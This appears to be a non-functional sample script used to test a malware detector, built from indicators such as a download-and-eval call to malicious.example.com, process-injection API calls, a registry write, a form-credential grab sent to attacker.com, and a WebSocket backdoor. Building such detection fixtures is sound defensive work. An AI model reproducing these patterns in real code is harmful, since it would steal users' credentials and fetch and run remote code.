// Suspicious script with multiple detection patterns
var shell = "cmd.exe";
var payload = "powershell -exec bypass";
var malicious_url = "http://malicious.example.com/payload.exe";

function downloadAndExecute(url) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", malicious_url, true);
    xhr.onload = function() {
        eval(xhr.responseText);
        exec(payload);
    };
    xhr.send();
}

function injectCode() {
    // Virtual memory manipulation
    var mem = VirtualAlloc(0x1000);
    WriteProcessMemory(mem, payload);
    CreateRemoteThread(targetProcess, mem);
}

// Registry manipulation
var registry = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows";
WriteToRegistry(registry, "malicious_key", payload);

// Code injection patterns
function injectDLL(process, dllPath) {
    LoadLibraryA(dllPath);
    GetProcAddress(process, "malicious_function");
}

// Credential stealing
function stealCredentials() {
    var credentials = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    };
    sendToServer("http://attacker.com/steal", credentials);
}

// Network communication
function createBackdoor() {
    var socket = new WebSocket("ws://command-server.com:12345");
    socket.onopen = function() {
        socket.send("CONNECT " + navigator.userAgent);
    };
}
